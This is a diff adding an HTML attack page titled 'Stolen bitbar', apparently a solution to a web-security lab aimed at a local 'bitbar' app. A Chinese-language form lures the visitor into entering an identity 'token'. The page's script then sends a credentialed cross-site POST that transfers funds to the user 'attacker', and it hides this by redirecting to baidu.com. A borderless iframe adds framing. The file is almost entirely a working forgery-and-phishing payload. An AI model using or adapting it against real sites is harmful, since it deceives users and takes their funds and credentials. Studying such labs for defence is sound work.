@@ -1,0 +1,46 @@
+<!DOCTYPE html>
+<html>
+
+<head>
+    <meta charset='utf-8'>
+    <meta http-equiv='X-UA-Compatible' content='IE=edge'>
+    <title>Stolen bitbar</title>
+    <meta name='viewport' content='width=device-width, initial-scale=1'>
+    <script>
+        function transfer() {
+            const val = 10;
+
+            let token = document.getElementById("token").value;
+
+            if (token.length != 22) {
+                alert("请输入合法的token!");
+                document.getElementById("token").value = "";
+                return;
+            }
+
+            const xhr = new XMLHttpRequest();
+            xhr.open("POST", "http://127.0.0.1:3000/super_secure_post_transfer", false);
+            xhr.setRequestHeader('Content-type', 'application/x-www-form-urlencoded');
+            xhr.withCredentials = true;
+            try {
+                xhr.send(`destination_username=attacker&quantity=${val}&tokeninput=${token}`);
+            }
+            finally {
+                window.location.replace("https://www.baidu.com");
+            }
+        }
+    </script>
+
+</head>
+
+<body>
+    <label for="token">请输入以下token验证身份: </label>
+    <input type="text" , id="token">
+    <button type="button" onclick="transfer()">
+        验证
+    </button>
+    <br />
+    <iframe src="bp2.html" scrolling="no" class="iframe" frameborder="0"></iframe>
+</body>
+
+</html>
